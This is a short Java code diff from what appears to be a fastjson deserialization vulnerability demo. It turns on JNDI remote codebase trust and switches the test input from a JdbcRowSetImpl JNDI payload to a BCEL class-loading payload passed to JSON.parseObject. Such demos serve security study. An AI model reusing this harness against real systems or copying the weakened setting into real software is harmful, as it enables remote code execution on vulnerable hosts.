@@ -13,7 +13,8 @@ public class VulDemo {
     public static void main(String[] args) {
         System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true"); // 高版本jdk对jdni注入有限制，jdk8u122及以上
         String payload = PoC.jdbcRowSetImplPayload45();
-        JSON.parseObject(payload);
+        String[] payloads = PoC.bcelPayload("hacked！！");
+        JSON.parseObject(payloads[1]);
     }
 
 }
